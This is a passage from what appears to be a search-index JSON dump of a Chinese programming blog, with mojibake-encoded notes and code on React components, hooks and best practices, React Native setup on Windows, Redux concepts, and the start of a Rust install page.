Enter\u0026lt;/button\u0026gt;;\rconst buttonThree = \u0026lt;button\u0026gt;You Shall Not Pass\u0026lt;/button\u0026gt;;\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h3\u0026gt;Enter Your Age to Continue\u0026lt;/h3\u0026gt;\r\u0026lt;input\rstyle={inputStyle}\rtype=\u0026#34;number\u0026#34;\rvalue={this.state.input}\ronChange={this.handleChange} /\u0026gt;\u0026lt;br /\u0026gt;\r{\rthis.state.userAge === \u0026#39;\u0026#39;\r? buttonOne\r: this.state.userAge \u0026gt;= 18\r? buttonTwo\r: buttonThree\r}\r\u0026lt;/div\u0026gt;\r);\r}\r}; 4. æ ¹æ®propsæœ‰æ¡ä»¶åœ°æ¸²æŸ“ class Results extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;h1\u0026gt;\r{this.props.fiftyFifty ? \u0026#34;You Win!\u0026#34; : \u0026#34;You Lose!\u0026#34;}\r\u0026lt;/h1\u0026gt;\r)\r};\r};\rclass GameOfChance extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rcounter: 1\r}\rthis.handleClick = this.handleClick.bind(this);\r}\rhandleClick() {\rthis.setState({\rcounter: this.state.counter + 1\r});\r}\rrender() {\rconst expression = Math.random() \u0026gt;= 0.5 ? true : false\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.handleClick}\u0026gt;Play Again\u0026lt;/button\u0026gt;\r\u0026lt;Results fiftyFifty={expression} /\u0026gt;\r\u0026lt;p\u0026gt;{\u0026#39;Turn: \u0026#39; + this.state.counter}\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; 5. æ ¹æ®stateæœ‰æ¡ä»¶åœ°æ¸²æŸ“ class GateKeeper extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rinput: \u0026#39;\u0026#39;\r};\rthis.handleChange = this.handleChange.bind(this);\r}\rhandleChange(event) {\rthis.setState({ input: event.target.value })\r}\rrender() {\rlet inputStyle = {\rborder: \u0026#39;1px solid black\u0026#39;\r};\rif (this.state.input.length \u0026gt; 15) {\rinputStyle.border = \u0026#39;3px solid red\u0026#39;;\r}\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h3\u0026gt;Don\u0026#39;t Type Too Much:\u0026lt;/h3\u0026gt;\r\u0026lt;input\rtype=\u0026#34;text\u0026#34;\rstyle={inputStyle}\rvalue={this.state.input}\ronChange={this.handleChange} /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; åã€Array.map()æ¸²æŸ“æ•°ç»„ const frontEndFrameworks = [\r\u0026#39;React\u0026#39;,\r\u0026#39;Angular\u0026#39;,\r\u0026#39;Ember\u0026#39;,\r\u0026#39;Knockout\u0026#39;,\r\u0026#39;Backbone\u0026#39;,\r\u0026#39;Vue\u0026#39;\r];\rfunction Frameworks() {\rconst renderFrameworks = frontEndFrameworks.map((item, index) =\u0026gt;\r\u0026lt;li key={index}\u0026gt;{item}\u0026lt;/li\u0026gt;\r);\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Popular Front End JavaScript Frameworks\u0026lt;/h1\u0026gt;\r\u0026lt;ul\u0026gt;\r{renderFrameworks}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}; åä¸€ã€Array.Filter() åŠ¨æ€è¿‡æ»¤æ•°ç»„ class MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rusers: [\r{\rusername: \u0026#39;Jeff\u0026#39;,\ronline: true\r},\r{\rusername: \u0026#39;Alan\u0026#39;,\ronline: false\r},\r{\rusername: \u0026#39;Mary\u0026#39;,\ronline: true\r},\r{\rusername: \u0026#39;Jim\u0026#39;,\ronline: false\r},\r{\rusername: \u0026#39;Sara\u0026#39;,\ronline: true\r},\r{\rusername: \u0026#39;Laura\u0026#39;,\ronline: true\r}\r]\r}\r}\rrender() {\rconst usersOnline = this.state.users.filter(user =\u0026gt; user.online === true);\rconst renderOnline = usersOnline.map(user =\u0026gt; \u0026lt;li key={user.username}\u0026gt;{user.username}\u0026lt;/li\u0026gt;);\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Current Online Users:\u0026lt;/h1\u0026gt;\r\u0026lt;ul\u0026gt;\r{renderOnline}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; åäºŒã€ç”¨ renderToString åœ¨æœåŠ¡å™¨ä¸Šæ¸²æŸ“ React æœ‰ä¸¤ä¸ªå…³é”®åŸå› å¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæœåŠ¡å™¨ä¸Šçš„æ¸²æŸ“å¯èƒ½ä¼šåœ¨çœŸå®ä¸–ç•Œçš„åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨ã€‚\né¦–å…ˆï¼Œå¦‚æœä¸è¿™æ ·åšï¼Œå½“ React åº”ç”¨ç¨‹åºæœ€åˆåŠ è½½åˆ°æµè§ˆå™¨æ—¶ï¼Œå®ƒå°†åŒ…å«ä¸€ä¸ªä»£ç é‡å¾ˆå°‘çš„ HTML æ–‡ä»¶å’Œä¸€å¤§å † JavaScriptã€‚ è¿™å¯¹äºæœç´¢å¼•æ“æ¥è¯´å¯èƒ½ä¸å¤ªç†æƒ³ï¼Œå› ä¸ºå®ƒä»¬è¯•å›¾ä¸ºç½‘é¡µå†…å®¹ç”Ÿæˆç´¢å¼•ï¼Œä»¥ä¾¿äººä»¬å¯ä»¥æ‰¾åˆ°è¿™ä¸ªåº”ç”¨ã€‚ å¦‚æœåœ¨æœåŠ¡å™¨ä¸Šæ¸²æŸ“åˆå§‹ HTML æ ‡è®°å¹¶å°†å…¶å‘é€åˆ°å®¢æˆ·ç«¯ï¼Œåˆ™åˆå§‹é¡µé¢åŠ è½½çš„å†…å®¹åŒ…å«æœç´¢å¼•æ“å¯ä»¥æŠ“å–çš„æ‰€æœ‰é¡µé¢æ ‡è®°ã€‚\nå…¶æ¬¡ï¼Œè¿™åˆ›é€ äº†æ›´å¿«çš„åˆå§‹é¡µé¢åŠ è½½ä½“éªŒï¼Œå› ä¸ºæ¸²æŸ“çš„ HTML ä»£ç é‡è¦æ¯”æ•´ä¸ªåº”ç”¨ç¨‹åºçš„ JavaScript ä»£ç å°ã€‚ React ä»ç„¶èƒ½å¤Ÿè¯†åˆ«ä½ çš„åº”ç”¨å¹¶åœ¨åˆå§‹åŠ è½½åè¿›è¡Œç®¡ç†ã€‚\nclass App extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn \u0026lt;div/\u0026gt;\r}\r};\rReactDOMServer.renderToString(\u0026lt;App /\u0026gt;); ","description":"React çš„åŸºç¡€å†…å®¹ï¼Œä¸å†ä¼šåœ¨é¡¹ç›®ä¸­ä½¿ç”¨classç»„ä»¶","id":19,"section":"react","tags":null,"title":"React åŸºç¡€","uri":"https://codthing.github.io/react/react/react-base/"},{"content":"React æ˜¯ä¸€ä¸ªå£°æ˜å¼ã€é«˜æ•ˆä¸”çµæ´»çš„ JavaScript åº“\nä¸€ã€ç‰¹æ€§   è™šæ‹Ÿ DOMï¼šä¿å­˜åœ¨å†…å­˜ä¸­å¹¶é€šè¿‡ ReactDOM ç­‰åº“ä¸â€œçœŸå®â€DOM åŒæ­¥çš„ UI è¡¨ç¤ºã€‚ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œåªæœ‰å®é™…æ›´æ”¹çš„ç»„ä»¶æ‰ä¼šæ›´æ–°åˆ° DOMï¼Œè€Œä¸æ˜¯æ‰€æœ‰ç»„ä»¶ã€‚\n  å£°æ˜å¼ï¼šå£°æ˜å¼è§†å›¾ä½¿ä»£ç æ›´å¯é¢„æµ‹å’Œæ˜“äºè°ƒè¯•ã€‚\n  åŸºäº CDD å¼€å‘æ¨¡å¼\n  è·¨å¹³å° React-Native\n  åŒºåˆ«äºå‘½ä»¤å¼ï¼Œè¿™é‡Œæ‹¿ for ä¸¾ä¾‹\n1 2 3 4 5 6 7 8 9 10  //å‘½ä»¤å¼ï¼Œæˆ‘ç§°ä¹‹ä¸ºæ¾æ•£å¼ let n = [-9, 87, 72, 452, 32, -9]; for (let i = 0; i \u0026lt; n.length; i++) { console.log(n[i]); } //å£°æ˜å¼ï¼ˆå‡½æ•°å¼ï¼Œå°è£…æ€§æ›´å¥½ï¼‰ let n = [-9, 87, 72, 452, 32, -9]; n.forEach((v) =\u0026gt; console.log(v));   äºŒã€ç›®å½•ç»“æ„ æ‹¿ nextjs ä¸¾ä¾‹\n pages  index.tsx   components  button.component.tsx   public  favicon.ico   styles  global.module.css    ä¸‰ã€Hooks  Hooks è®©ä½ æ— éœ€ç¼–å†™ç±»å³å¯ä½¿ç”¨çŠ¶æ€å’Œå…¶ä»– React åŠŸèƒ½ã€‚ ä¸é€‚ç”¨äºåŸºäºç±»çš„ç»„ä»¶ã€‚  #. è°ƒç”¨ Hooks  ä¸è¦åœ¨å¾ªç¯ã€æ¡ä»¶æˆ–åµŒå¥—å‡½æ•°ä¸­è°ƒç”¨ Hookã€‚æ­¤å¤–ï¼Œæ°¸è¿œä¸è¦ä»å¸¸è§„ JavaScript å‡½æ•°è°ƒç”¨ Hookã€‚å®ƒä»¬åº”è¯¥ä» React åŠŸèƒ½ç»„ä»¶çš„é¡¶å±‚ä¸­è°ƒç”¨ã€‚  #. ä½¿ç”¨ ESLint æ’ä»¶ å¯ä»¥ä½¿ç”¨ eslint-plugin-react-hooks å¼ºåˆ¶ä» React åŠŸèƒ½ç»„ä»¶ä¸­å’Œè‡ªå®šä¹‰ Hook ä¸­è°ƒç”¨ Hookã€‚\n1 2  yarn add --dev eslint-plugin-react-hooks   1 2 3 4 5 6 7 8 9 10 11 12 13  //ESLint é…ç½® { \u0026#34;plugins\u0026#34;: [ // ...  \u0026#34;react-hooks\u0026#34; ], \u0026#34;rules\u0026#34;: { // ...  \u0026#34;react-hooks/rules-of-hooks\u0026#34;: \u0026#34;error\u0026#34;, // æ£€æŸ¥ Hooks çš„è§„åˆ™  \u0026#34;react-hooks/exhaustive-deps\u0026#34;: \u0026#34;warn\u0026#34; // æ£€æŸ¥ effect ä¾èµ–  } }   ä¸‰ã€è¡¨å•éªŒè¯  react-hook-form Formik kendo-react-form  å››ã€JSX é€Ÿè®°  å½“ä½¿ç”¨ props æ§åˆ¶ç»„ä»¶å¯è§æ€§æ—¶  1 2 3 4  showRatings={true} \u0026lt;Reviews showRatings /\u0026gt;   äº”ã€ç±»å‹æ£€æŸ¥  ä½¿ç”¨ React.PropTypes  1 2 3 4 5 6 7 8 9  const MyComponent = (props) =\u0026gt; { const { username } = props; return \u0026lt;div\u0026gt;{props.name}\u0026lt;/div\u0026gt;; }; PropTypeMyComponent.PropTypes = { name: PropTypes.string.isRequired, };    ä½¿ç”¨ TypeScript (é¦–æ¨)  1 2 3 4 5 6 7 8  interface props { username?: string; } const Mycomponent = ({ username }: props) =\u0026gt; { return \u0026lt;div\u0026gt;{username}\u0026lt;/div\u0026gt;; };   å…­ã€ä½¿ç”¨ Memo æå‡æ€§èƒ½ React.Memo é«˜é˜¶ç»„ä»¶ç¯ç»•ç»„ä»¶ä»¥è®°ä½æ¸²æŸ“çš„è¾“å‡ºå¹¶è·³è¿‡ä¸å¿…è¦çš„æ¸²æŸ“ã€‚\n1 2 3 4  const ChildrenComponent = React.memo(({userName}) =\u0026gt; { return \u0026lt;div\u0026gt;{userName}\u0026lt;/div\u0026gt; })   ä¸ƒã€ä½¿ç”¨ Fragments / \u0026lt;\u0026gt;\u0026lt;/\u0026gt; React ä¸­çš„ä¸€ä¸ªå¸¸è§æ¨¡å¼æ˜¯ä¸€ä¸ªç»„ä»¶è¿”å›å¤šä¸ªå…ƒç´ ã€‚\nFragments å…è®¸ä½ å°†å­åˆ—è¡¨åˆ†ç»„ï¼Œè€Œæ— éœ€å‘ DOM æ·»åŠ é¢å¤–èŠ‚ç‚¹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  return ( \u0026lt;React.Fragment\u0026gt; \u0026lt;ChildA /\u0026gt; \u0026lt;ChildB /\u0026gt; \u0026lt;ChildC /\u0026gt; \u0026lt;/React.Fragment\u0026gt; ); // or çŸ­è¯­æ³•  return ( \u0026lt;\u0026gt; \u0026lt;ChildA /\u0026gt; \u0026lt;ChildB /\u0026gt; \u0026lt;ChildC /\u0026gt; \u0026lt;/\u0026gt; )   ","description":"ä¼šæ—¶å¸¸æ›´æ–°ï¼Œå› ä¸ºReactçš„å‘å±•å¾ˆå¿«ä¸”ç¤¾åŒºå¾ˆåºå¤§","id":20,"section":"react","tags":null,"title":"React æœ€ä½³å®è·µ","uri":"https://codthing.github.io/react/react/react-bp/"},{"content":"å¼€å‘å¹³å°ï¼šWindows\nç›®æ ‡å¹³å°ï¼šAndroid\nReactNative ç‰ˆæœ¬ï¼š0.62.2\nä¸€ã€å®‰è£…ä¾èµ–  Node (\u0026gt;=12) Python2 (Windows x86 MSI installer) Java SE Development Kit (JDK) (1.8 ç‰ˆæœ¬) æ³¨æ„ï¼šè¦æœ€æ–°ç‰ˆæœ¬ï¼Œè¦æ—¶å¸¸æ›´æ–° Yarn (ä¸‹è½½æ¯” npm å¿«)  npm install -g yarn Android Studio (åªç”¨ä¾èµ–ï¼Œä¸è¦ç”¨æ¥è®¾ç½®è®¾å¤‡ï¼Œå› ä¸ºéå¸¸åƒè®¡ç®—æœºç³»ç»Ÿç›˜å®¹é‡å’Œæ€§èƒ½)  //1. å®‰è£…ç•Œé¢ä¸­é€‰æ‹©\u0026#34;Custom\u0026#34;é€‰é¡¹ï¼Œç¡®ä¿é€‰ä¸­äº†ä»¥ä¸‹å‡ é¡¹ï¼š\rAndroid SDK\rAndroid SDK Platform\r//ç„¶åç‚¹å‡»\u0026#34;Next\u0026#34;æ¥å®‰è£…é€‰ä¸­çš„ç»„ä»¶ã€‚\r//2. æ¬¢è¿ç•Œé¢ä¸­ç‚¹å‡»\u0026#34;Configure\u0026#34;ï¼Œåœ¨ SDK Manager ä¸­ã€‚\r// 1). é€‰æ‹©\u0026#34;SDK Platforms\u0026#34;é€‰é¡¹å¡ï¼Œç„¶ååœ¨å³ä¸‹è§’å‹¾é€‰\u0026#34;Show Package Details\u0026#34;ã€‚\r// å±•å¼€Android 9 (pie)é€‰é¡¹ï¼Œç¡®ä¿å‹¾é€‰äº†ä¸‹é¢è¿™äº›ç»„ä»¶ï¼š\rAndroid SDK Platform 28\r// 2). é€‰æ‹©\u0026#34;SDK Tools\u0026#34;é€‰é¡¹å¡ï¼ŒåŒæ ·å‹¾ä¸­å³ä¸‹è§’çš„\u0026#34;Show Package Details\u0026#34;ã€‚\r// å±•å¼€\u0026#34;Android SDK Build-Tools\u0026#34;é€‰é¡¹ï¼Œç¡®ä¿é€‰ä¸­äº† React Native æ‰€å¿…é¡»çš„ï¼š\r28.0.3 ï¼ˆç‰ˆæœ¬ï¼‰\r// 3). æœ€åç‚¹å‡»\u0026#34;Apply\u0026#34;æ¥ä¸‹è½½å’Œå®‰è£…è¿™äº›ç»„ä»¶ã€‚ é…ç½®ç¯å¢ƒå˜é‡  //1. åˆ›å»ºANDROID_HOMEç¯å¢ƒå˜é‡ï¼ˆç³»ç»Ÿæˆ–ç”¨æˆ·å˜é‡å‡å¯ï¼‰\rANDROID_HOME\rC:\\Users\\Administrator\\AppData\\Local\\Android\\Sdk\r//2. ç¯å¢ƒå˜é‡ Path ä¸­æ·»åŠ ä»¥ä¸‹å·¥å…·ç›®å½•\r%ANDROID_HOME%\\platform-tools\r%ANDROID_HOME%\\emulator\r%ANDROID_HOME%\\tools\r%ANDROID_HOME%\\tools\\bin äºŒã€å®‰è£…æ¨¡æ‹Ÿå™¨ //æ¨¡æ‹Ÿå™¨æ˜¯åŸºäºè™šæ‹Ÿæœºè¿è¡Œï¼Œæ‰€ä»¥è¿è¡Œæ€§èƒ½è‰¯å¥½\rGenymotion æ¨¡æ‹Ÿå™¨ //å¹³å¸¸åªå¼€å¯è¿™ä¸ªå°±å¯ä»¥äº†ï¼Œä¸ç”¨æ‰‹åŠ¨å»å¯åŠ¨VirtualBoxè™šæ‹Ÿæœº;å¯ä»¥ç‚¹å‡»debugç”¨Chromeæµè§ˆå™¨åšè°ƒè¯•ä¹Ÿå¯ä»¥ã€‚\rVirtualBox è™šæ‹Ÿæœº\r//ä¸¤è€…éƒ½å®‰è£…å¥½ä»¥åï¼Œåˆ›å»ºå®‰å“è®¾å¤‡ï¼Œå¦‚æœé‡åˆ°æ‰“å¼€ä¸äº†è®¾å¤‡ï¼Œåˆ™Genymotionæ¢å¤å‡ºå‚è®¾ç½®/é‡å¯ç”µè„‘ï¼Œå¤šè¯•å‡ æ¬¡ï¼Œæ‰èƒ½æ­£å¸¸æ‰“å¼€è®¾å¤‡\r//ç•™æ„ç”µè„‘æ˜¯å¦å¼€å¯äº†æ”¯æŒè™šæ‹Ÿè®¾å¤‡ï¼Œå¦‚æœæ²¡æœ‰åˆ™å»åˆ°Biosè®¾ç½®å¼€å¯ ä¸‰ã€åˆ›å»ºé¡¹ç›®å¹¶ç¼–è¯‘ //1.åˆ›å»ºé¡¹ç›®\rnpx react-native init MyApp --template react-native-template-typescript\r//2.å®‰è£…ä¾èµ–\ryarn install\r//3.å¯åŠ¨ Metro Bundle(Metroæ˜¯RNçš„æ‰“åŒ…å·¥å…·)\ryarn start\r//4.å°†åœ¨æ¨¡æ‹Ÿå™¨æˆ–ä»»ä½•è¿æ¥çš„ android è®¾å¤‡ä¸Šæ„å»ºå¹¶æ‰“å¼€åº”ç”¨ã€‚\ryarn android //æˆ–è€… yarn react-native run-android ","description":"","id":21,"section":"react-native","tags":null,"title":"React-Native åŸºç¡€","uri":"https://codthing.github.io/react-native/react-native/rn-base/"},{"content":"Redux æ˜¯ä¸€ä¸ªçŠ¶æ€ç®¡ç†æ¡†æ¶ï¼Œ\nä½†æˆ‘è§‰å¾—å®ƒåŒæ—¶ä¹Ÿæ˜¯ä¸€é—¨è¯­è¨€ï¼Œå› ä¸ºå®ƒæœ‰è‡ªå·±çš„ä¸€å¥—è¡Œäº‹è§„åˆ™ã€‚\nRedux ä»£ç åº“æœ¬èº«å¾ˆå°ï¼Œæ ¸å¿ƒæ¦‚å¿µä¹Ÿå¾ˆç®€æ´æ˜äº†ï¼Œä½†æ˜¯å®ƒçš„ â€œè¯­è¨€â€ å´ä¸å¯»å¸¸ï¼Œ\nåŠ ä¹‹ Redux å·²ç»æœ‰ä¸€æ®µå†å²äº†ï¼Œéœ€è¦äº†è§£å®ƒçš„ä¸€ä¸ªæŠ€æœ¯å˜é©è¿‡ç¨‹ï¼Œè¿™æ ·æ‰èƒ½æ›´å¥½çš„ç†è§£å®ƒå’Œä½¿ç”¨å®ƒã€‚\nä¸€ã€äº†è§£ Redux 1. åŠ¨æœº å‰ç«¯é€»è¾‘å˜å¾—è¶Šæ¥è¶Šå¤æ‚ï¼Œ\nè¿™ç§å¤æ‚æ€§å¾ˆéš¾å¤„ç†ï¼Œå› ä¸ºäººç±»å¤§è„‘å¾ˆéš¾æ¨ç†ä¸¤ä¸ªæ¦‚å¿µï¼šçªå˜å’Œå¼‚æ­¥ã€‚\nReact é€šè¿‡åˆ é™¤å¼‚æ­¥å’Œç›´æ¥æ“ä½œDOMæ¥è§£å†³è§†å›¾å±‚ä¸­çš„è¿™ä¸ªé—®é¢˜ã€‚\nä½†æ˜¯ï¼Œç®¡ç†æ•°æ®çš„çŠ¶æ€ç”±å¼€å‘è€…å†³å®šã€‚è¿™å°±æ˜¯ Redux è¿›å…¥çš„åœ°æ–¹ã€‚\n2. ä¸‰å¤§åŸåˆ™ï¼ˆæ ¸å¿ƒå†…å®¹ï¼‰ 1). å•ä¸€æ•°æ®æº åº”ç”¨çš„å…¨å±€çŠ¶æ€å­˜å‚¨åœ¨å•ä¸ªstoreå†…çš„å¯¹è±¡æ ‘ä¸­ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  console.log(store.getState()) /* Prints { visibilityFilter: \u0026#39;SHOW_ALL\u0026#39;, todos: [ { text: \u0026#39;Consider using Redux\u0026#39;, completed: true, }, { text: \u0026#39;Keep all state in a single tree\u0026#39;, completed: false } ] } */   2). çŠ¶æ€æ˜¯åªè¯»çš„ æ”¹å˜çŠ¶æ€çš„å”¯ä¸€æ–¹æ³•æ˜¯å‘å‡ºä¸€ä¸ªActionåŠ¨ä½œï¼Œå®ƒæ˜¯æè¿° â€œå‘ç”Ÿäº†ä»€ä¹ˆâ€ çš„å­—é¢é‡å¯¹è±¡ã€‚\n1 2 3 4 5 6 7 8 9 10  store.dispatch({ type: \u0026#39;COMPLETE_TODO\u0026#39;, index: 1 }) store.dispatch({ type: \u0026#39;SET_VISIBILITY_FILTER\u0026#39;, filter: \u0026#39;SHOW_COMPLETED\u0026#39; })   3). ä½¿ç”¨çº¯å‡½æ•°è¿›è¡Œæ›´æ”¹ï¼ˆçŠ¶æ€å‰¯æœ¬ï¼‰ ç¼–å†™çº¯ reducers å‡½æ•°ï¼Œå®ƒæ¥å— å‰ä¸€ä¸ªçŠ¶æ€ å’Œä¸€ä¸ª åŠ¨ä½œï¼Œç„¶å è¿”å›ä¸‹ä¸€ä¸ªçŠ¶æ€ã€‚è®°ä½è¦è¿”å›æ–°çš„çŠ¶æ€å¯¹è±¡ï¼Œè€Œä¸æ˜¯æ”¹å˜ä»¥å‰çš„çŠ¶æ€ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  function visibilityFilter(state = \u0026#39;SHOW_ALL\u0026#39;, action) { switch (action.type) { case \u0026#39;SET_VISIBILITY_FILTER\u0026#39;: return action.filter default: return state } } function todos(state = [], action) { switch (action.type) { case \u0026#39;ADD_TODO\u0026#39;: return [ ...state, { text: action.text, completed: false } ] case \u0026#39;COMPLETE_TODO\u0026#39;: return state.map((todo, index) =\u0026gt; { if (index === action.index) { return Object.assign({}, todo, { completed: true }) } return todo }) default: return state } } import { combineReducers, createStore } from \u0026#39;redux\u0026#39; const reducer = combineReducers({ visibilityFilter, todos }) const store = createStore(reducer)   3. è¯æ±‡è¡¨ 1). State çŠ¶æ€ type State = any ç”± store ç®¡ç†å¹¶ç”± getState() è·å–ã€‚\nä¸è¦åœ¨ State ä¸­æ”¾ä»»ä½•ä¸èƒ½è½»æ˜“è½¬æ¢æˆ JSON çš„ä¸œè¥¿ï¼Œåº”è¯¥å°½æœ€å¤§åŠªåŠ›ä¿æŒçŠ¶æ€å¯åºåˆ—åŒ–ã€‚\n2). Action åŠ¨ä½œ type Action = Object å¿…é¡»æœ‰ä¸€ä¸ª type å­—æ®µæ¥å®šä¹‰ action çš„ç±»å‹ã€‚ç±»å‹å¯ä»¥å®šä¹‰ä¸ºå¸¸é‡å¹¶ä»å¦ä¸€ä¸ªæ¨¡å—å¯¼å…¥ã€‚\n3). Reducer å‡é€Ÿå™¨ï¼ˆæœ€é‡è¦çš„æ¦‚å¿µï¼‰ type Reducer\u0026lt;S, A\u0026gt; = (state: S, action: A) =\u0026gt; S Reducer ç”¨äºå°†å€¼çš„é›†åˆå‡å°‘ä¸ºå•ä¸ªå€¼,å¹¶ä¸æ˜¯ Redux ç‹¬æœ‰çš„ï¼Œå®ƒæ˜¯å‡½æ•°å¼ç¼–ç¨‹ä¸­çš„ä¸€ä¸ªåŸºæœ¬æ¦‚å¿µã€‚ä¾‹å¦‚ Array.prototype.reduce()\nç»™å®šå‰ä¸€ä¸ªstateå’Œä¸€ä¸ªactionï¼ŒReducer è®¡ç®—ä¸€ä¸ªæ–°stateã€‚å®ƒå¿…é¡»æ˜¯çº¯å‡½æ•° â€”â€” å¯¹äºç»™å®šçš„è¾“å…¥è¿”å›å®Œå…¨ç›¸åŒçš„è¾“å‡ºçš„å‡½æ•°ã€‚\nä¸è¦å°† API è°ƒç”¨æ”¾å…¥ reducerã€‚\n4). Dispatch åŠ¨ä½œè°ƒåº¦ type BaseDispatch = (a: Action) =\u0026gt; Action\rtype Dispatch = (a: Action | AsyncAction) =\u0026gt; any åŒºåˆ†ä¸€èˆ¬è°ƒåº¦å’Œä¸­é—´ä»¶è°ƒåº¦ã€‚\nä¸€èˆ¬è°ƒåº¦æ˜¯åŒæ­¥çš„ï¼Œä¸­é—´ä»¶è°ƒåº¦å¾€å¾€æ˜¯å¼‚æ­¥çš„ã€‚\n5). Action creator åŠ¨ä½œåˆ›å»ºå™¨ type ActionCreator\u0026lt;A, P extends any[] = any[]\u0026gt; = (...args: P) =\u0026gt; Action | AsyncAction åˆ›å»º action çš„æ–¹æ³•ã€‚\nå¦‚æœ action åˆ›å»ºå™¨éœ€è¦è¯»å–å½“å‰çŠ¶æ€ã€æ‰§è¡Œ API è°ƒç”¨æˆ–å¼•èµ·å‰¯ä½œç”¨ï¼ˆå¦‚è·¯ç”±è½¬æ¢ï¼‰ï¼Œå®ƒåº”è¯¥è¿”å›å¼‚æ­¥ action è€Œä¸æ˜¯ä¸€èˆ¬ actionã€‚\n6). async Action å¼‚æ­¥åŠ¨ä½œ type AsyncAction = any ä¸ä¼šç«‹å³ä¼ é€’ç»™ reducerï¼Œè€Œæ˜¯åœ¨ å¼‚æ­¥action è½¬æ¢ä¸º åŒæ­¥action åæ‰è§¦å‘ dispatchã€‚\n7). Middleware ä¸­é—´ä»¶ type MiddlewareAPI = { dispatch: Dispatch, getState: () =\u0026gt; State }\rtype Middleware = (api: MiddlewareAPI) =\u0026gt; (next: Dispatch) =\u0026gt; Dispatch ä¸­é—´ä»¶æ˜¯ä¸€ä¸ªé«˜é˜¶å‡½æ•°ï¼Œå®ƒé€šå¸¸å°†å¼‚æ­¥actionè½¬åŒ–ä¸ºactionã€‚\nå®ƒåœ¨è°ƒåº¦ä¸€ä¸ªactionå’Œå®ƒåˆ°è¾¾reducerçš„é‚£ä¸€åˆ»ä¹‹é—´æä¾›äº†ä¸€ä¸ªç¬¬ä¸‰æ–¹æ‰©å±•ç‚¹ã€‚\né€šå¸¸ä½¿ç”¨ä¸­é—´ä»¶è¿›è¡Œæ—¥å¿—è®°å½•ã€å´©æºƒæŠ¥å‘Šã€ä¸å¼‚æ­¥ API é€šä¿¡ã€è·¯ç”±ç­‰ã€‚\n8). Store type Store = {\rdispatch: Dispatch //åŸºæœ¬è°ƒåº¦å‡½æ•°\rgetState: () =\u0026gt; State //è¿”å›Storeçš„å½“å‰çŠ¶æ€\rsubscribe: (listener: () =\u0026gt; void) =\u0026gt; () =\u0026gt; void //æ³¨å†Œè¦åœ¨çŠ¶æ€æ›´æ”¹æ—¶è°ƒç”¨çš„å‡½æ•°\rreplaceReducer: (reducer: Reducer) =\u0026gt; void //å¯ç”¨äºå®ç°çƒ­é‡è½½å’Œä»£ç æ‹†åˆ†ã€‚å¾ˆå°‘ç”¨åˆ°ã€‚\r} store æ˜¯ä¿å­˜åº”ç”¨çŠ¶æ€æ ‘çš„å¯¹è±¡ã€‚\nRedux åº”ç”¨ä¸­åº”è¯¥åªæœ‰ä¸€ä¸ª storeï¼Œå› ä¸ºé€»è¾‘å‘ç”Ÿåœ¨ reducer çº§åˆ«ã€‚\n9). Store creator åˆ›å»ºå™¨ type StoreCreator = (reducer: Reducer, preloadedState: ?State) =\u0026gt; Store åˆ›å»º store çš„å‡½æ•°\n10). Store enhancer å¢å¼ºå™¨ type StoreEnhancer = (next: StoreCreator) =\u0026gt; StoreCreator é«˜é˜¶å‡½æ•°ï¼Œå®ƒç»„åˆstoreåˆ›å»ºå™¨ä»¥è¿”å›æ–°çš„å¢å¼ºstoreåˆ›å»ºå™¨ã€‚Redux ä¸­é—´ä»¶å®ç°æœ¬èº«å°±æ˜¯ä¸€ä¸ªstoreå¢å¼ºå™¨ã€‚\nstoreå¢å¼ºå™¨ä¸ React ä¸­çš„é«˜é˜¶ç»„ä»¶çš„æ¦‚å¿µå¤§è‡´ç›¸åŒï¼Œæœ‰æ—¶ä¹Ÿç§°ä¸ºâ€œç»„ä»¶å¢å¼ºå™¨â€ã€‚\nå› ä¸ºå®ƒä¸æ˜¯å®ä¾‹ï¼Œè€Œæ˜¯å‡½æ•°çš„æ™®é€šå¯¹è±¡é›†åˆï¼Œæ‰€ä»¥å¯ä»¥è½»æ¾åˆ›å»ºå’Œä¿®æ”¹å‰¯æœ¬ï¼Œè€Œæ— éœ€æ”¹å˜åŸå§‹storeã€‚\n\räºŒã€ä½¿ç”¨ Redux ","description":"Redux æ˜¯ä¸€ä¸ªçŠ¶æ€ç®¡ç†æ¡†æ¶","id":22,"section":"react","tags":null,"title":"Redux","uri":"https://codthing.github.io/react/redux/redux-base/"},{"content":"é«˜çº§äººä½“å·¥ç¨‹å­¦å’Œä½çº§æ§åˆ¶åœ¨ç¼–ç¨‹è¯­è¨€è®¾è®¡ä¸­å¾€å¾€æ˜¯ä¸ä¸€è‡´çš„ï¼›Rust æŒ‘æˆ˜äº†è¿™ç§å†²çªã€‚ ä¸€ã€å®‰è£… ä¸‹è½½å®‰è£…å™¨ï¼Œç„¶åè¿è¡Œè¯¥ç¨‹åºå¹¶éµå¾ªå±å¹•ä¸Šçš„æŒ‡ç¤ºã€‚\näºŒã€è·å–æœ€æ–°çš„ Rust rustup update ä¸‰ã€Cargo: Rust çš„æ„å»ºå·¥å…·å’ŒåŒ…ç®¡ç†å™¨ åœ¨å®‰è£… Rustup æ—¶ï¼Œä¹Ÿä¼šå®‰è£… Rust 